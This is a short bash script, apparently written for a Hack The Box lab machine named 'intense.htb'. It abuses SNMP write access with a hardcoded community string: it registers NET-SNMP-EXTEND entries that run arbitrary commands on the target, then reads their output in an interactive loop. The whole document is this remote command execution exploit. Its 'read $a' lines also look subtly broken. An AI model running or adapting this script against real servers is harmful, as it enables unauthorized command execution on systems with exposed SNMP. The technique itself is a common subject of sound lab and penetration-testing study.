#!/bin/bash

while [ 1 ]
do
  echo 'cmd:'
  read $a
  echo 'args:'
  read $b

  snmpset -m +NET-SNMP-EXTEND-MIB -v 1 -c SuP3RPrivCom90 intense.htb 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' = $a 'nsExtendArgs."command"' = "$b"

  sleep 2 

  snmpwalk -v 1 -c SuP3RPrivCom90 intense.htb nsExtendObjects
done

